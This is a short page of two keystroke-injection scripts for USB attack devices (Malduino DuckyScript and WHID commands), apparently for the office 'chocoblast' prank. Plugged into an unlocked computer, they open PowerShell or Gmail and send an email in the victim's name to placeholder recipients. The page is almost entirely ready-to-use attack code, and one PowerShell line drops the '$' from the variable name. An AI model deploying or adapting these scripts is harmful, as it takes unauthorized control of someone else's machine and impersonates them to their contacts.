# CHOCOBLAST

## MALDUINO (outlook)

```powershell
REM CHOCOBLAST
LOCALE FR
DELAY 1000
GUI r
STRING powershell
ENTER
DELAY 1000
STRING outlook = new-object -comobject outlook.application
ENTER
STRING $email = $outlook.CreateItem(0)
ENTER
STRING $email.To = "MAIL1,MAIL2"
ENTER
STRING $email.Subject = "New email test"
ENTER
STRING $email.Body = "This is a testing email" 
ENTER
STRING $email.Send()
ENTER
STRING $outlook.Quit()
ENTER
STRING [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
ENTER
```

## WHID (gmail)

```bash
Print:MAIL1,MAIL2
Press:179
Print:Choco
Press:179
Print:J'apporte les chocos la prochaine fois
Press:179
Press:32
```